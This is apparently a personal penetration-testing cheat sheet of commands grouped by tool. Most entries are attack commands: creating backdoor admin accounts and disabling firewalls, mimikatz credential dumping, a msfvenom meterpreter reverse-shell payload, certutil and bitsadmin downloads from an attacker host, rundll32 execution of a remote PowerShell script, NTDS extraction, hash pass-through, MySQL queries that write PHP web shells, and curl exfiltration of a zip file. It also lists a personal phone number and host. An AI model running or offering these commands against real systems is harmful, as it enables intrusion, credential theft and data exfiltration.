



menu, chisel
menu, curl
menu, dig
menu, download
menu, email
menu, ffuf
menu, find
menu, git
menu, gobuster
menu, grep
menu, ip
menu, iptables
menu, lfi
menu, merlin
menu, msfvenom
menu, mysql
menu, nikto
menu, nmap
menu, nslookup
menu, passwd
menu, priv
menu, python
menu, sed
menu, sockat
menu, spawn
menu, sshuttle
menu, tar
menu, tmux
menu, tor
menu, vi
menu, windows
menu, wireshark
menu, wpscan
menu, xfreerdp
menu, exfiltration
menu, zeek
menu, aws
menu, windwsID
menu, setfacl
menu, shell
my, mka.hopto.org
my, noip.com
my, ssh 55522
tel, 07429322354

windows, net user hacker hackP@ssw0rd /add
windows, net localgroup administrators hacker /add
windows, netsh advfirewall set allprofiles state off
windows, net localgroup "Remote Desktop Users" Everyone /Add
windows, Invoke-WebRequest "http://1.1.1.1/mimikatz.exe" -outfile "mimikatz.exe"
windows, .\mimikatz "log host-31.log" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit
windows, Invoke-WebRequest "http://1.1.1.1/applocker-bypas-checker.ps1.txt" -outfile "applocker-bypas-checker.ps1"
windows, .\ applocker-bypas-checker.ps1
windows, sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=16666 -f dll -o kavremoverENU.dll
windows, net user /domain
windows, crackmapexec smb 10.200.x.0/24 -u <user> -d <domain> -H <hash>
windows, evil-winrm -i <address> -u <user> -H <hash>
windows, https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md.
windows, https://github.com/HackLikeAPornstar/GibsonBird/blob/master/chapter4/applocker-bypas-checker.ps1.
windows, https://github.com/GhostPack/Seatbelt       Seatbelt-master\Seatbelt-master\Seatbelt\bin\Debug
windows, https://github.com/PwnDexter/SharpEDRChecker/releases/tag/1.1
windows, certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
windows, certutil -encode payload.exe Encoded-payload.txt
windows, bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
windows, findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe
windows, certutil -decode Encoded_file payload.txt
windows, explorer.exe /root,"C:\Windows\System32\calc.exe"   -> In order to create a child process of explorer.exe parent, we can execute the following command:
windows, wmic.exe process call create calc
windows, rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
windows, rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
windows, bash.exe -c "path-to-payload"
windows,  -- "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noni certutil -urlcache -split -f
windows, -- icacls c:\Users\sage\service.exe /grant Everyone:F  jest wazne czasami exe moze nie dzialac bo sa rights    !!!!!!!!!!!!!!!



windows, sudo python3 ntlmrelayx.py -t smb://10.200.107.30 -smb2support -socks    and then on windows nslookup DC-SRV01
windows, /usr/share/doc/python3-impacket/examples/smbclient.py anonymous:aonymous@1.1.1.1
windows, Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
windows,  Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose
windows, takeown /F "C:\PS" - To make yourself the owner of, for example, the C:\PS directory, enter the following command:
windows, dir c:\ps /q You can display the current owner of a folder or all nested objects with the command:
windows, Get-Acl "C:\PS\ip_list.txt" | Select-Object Owner
windows, Get-ChildItem C:\ps -recurse | ForEach-Object{Get-Acl $_.FullName|select path,owner}
windows, takeown /F "C:\permissions.log " /S lonPC2213.theitbros.com
windows, icacls c:\ps\* /setowner bjackson /T /C /L /Q
windows, ICACLS <filename> /grant administrators:F - assign file permissions
windows, ICACLS <filename> /grant %username%:F
windows, ICACLS <filename> /grant John:F
windows, takeown /f <foldername>
windows, takeown /f <foldername> /a
windows, takeown /f <foldername> /r /d y
windows, TAKEOWN /F <foldername> /a /r /d y
windows, icacls <foldername> /grant administrators:F /T
windows, icacls "file_or_folder_name" /setowner "NT Service\TrustedInstaller"
windows, icacls "D:\Annual Reports\2020\November" /setowner "John"
windows, icacls "D:\Tax Audit\November.xlsx" /setowner "John"
windows, icacls "D:\Tax Audit\November.xlsx" /setowner "Administrators"
windows, icacls "folder_name" /setowner "Administrators" /T
windows, icacls "path\filename" /setowner "NT Service\TrustedInstaller"
windows, icacls "C:\Windows\PolicyDefinitions\WindowsStore.admx" /setowner "NT Service\TrustedInstaller"
windows, fsutil.exe hardlink list C:\Windows\notepad.exe
windows, good link to change permission https://www.winhelponline.com/blog/take-ownership-of-file-or-folder/
windowd, "C:\windows\System32\Wbem\WMIC.exe" /node:WORKSTATION6 process call create "net user /add A1berto paw0rd1"
windows, smb smbserver.py share . -smb2support -username mka -password mka
windows, smb net use \\10.14.32.90\share /u:mka  mka
windows, smb net use M: \\10.10.14.15\share /user:mka mka
windows, sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support
windows, mimikatz  !+
windows, mimikatz   !processprotect /process:lsass.exe /remove
windows, mimikatz    privilege::debug
windows, mimikatz     privilege::debug           OR sekurlsa::logonpasswords
windows, 
windows, runas /savecred /user:THM.red\thm-local cmd.exe     to figure out user paht use 'cmdkey /list'
windows, powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
windows, ntdsutil.exe ->  python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local

windows, post sending file curl -d @exfil.zip http://huntmeplz.com:8080/
vnc, nie ma usera attackuje bez usera
vnc, hydra  -P /opt/rockyou.txt vnc://10.10.48.55 -V
vnc, zeby sie polaczyc to przez remmina
sshuttle, apt-get install sshuttle
sshuttle, sudo sshuttle -D -N -r linux-admin:linuxrulez@10.200.107.33 -x 10.200.107.33 10.200.107.0/24 -vvv
sshuttle, nie dawaj haslo bo bedzie cetyfikat do potwierdzenia 

date, date +'%s'  epoc format

passwd, openssl passwd -6 --salt mka111 "mka111"   ->  $6$mka111$t2M0va0gq5BlWVz0TLbyRDlplsnQdkCj/NAXOgLY06lxJZMlm.CHTdys.VxySXRV1Y./4Kg2ypvB3t7aDqMcH1
passwd, USERNAME:HASH:0:0::/root:/bin/bash
passwd, mka:$6$mka$t2M0va0gq5BlWVz0TLbyRDlplsnQdkCj/NAXOgLY06lxJZMlm.CHTdys.VxySXRV1Y./4Kg2ypvB3t7aDqMcH1:0:0::/root:/bin/bash

mysql, select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
mysql, select load_file("/etc/passwd");
mysql, ! ls -l
mysql, ! bash
mysql, union all select 1,2,3,4,"&lt;?php echo shell_exec($_GET['cmd']);?&gt;",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
mysql, union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),


vi, 3yy - Yank (copy) three lines
vi, y$ - Yank (copy) everything from the cursor to the end of the line.
vi, y^ - Yank (copy) everything from the cursor to the start of the line.
vi, yw - Yank (copy) to the start of the next word.
vi, yiw – Yank (copy) the current word.
vi, y% - Yank (copy) to the matching character. By default supported pairs are (), {}, and []. Useful to copy text between matching brackets.
vi, dd - Delete (cut) the current line, including the newline character.
vi, 3dd - Delete (cut) three lines, starting from the line where the cursor is positioned,
vi, d$ - Delete (cut) everything from the cursor to the end of the line.
vi, 

wireshark, tshark -r capture.pcapng -Y 'http.user_agent' | grep -w '9ab62b5' | grep -v 'HTTP 166' | awk '{print $9}' | sed 's/q=/ /g' | awk '{print $2}'  

ffuf, ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://1.1.1.1/FUZZ -o 80-directory.txt
ffuf, ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u http://1.1.1.1/FUZZ -e  .txt,.php,.bk,.conf  -o 80-filex.txt
ffuf, ffuf -u http://1.1.1.1.1  -H "Host: FUZZ.holo.live" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -o 80-subdomain.txt 
ffuf, ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u http://1.1.1.1/secret/FUZZ.txt -fc 403
ffuf, ffuf -w vhostnames.txt -u https://target -H "Host: FUZZ. target" -acc "www"
ffuf, ffuf -w <path-wordlist> -u http://1.1.1.1.1/FUZZ -e .aspx,.php,.txt,.html
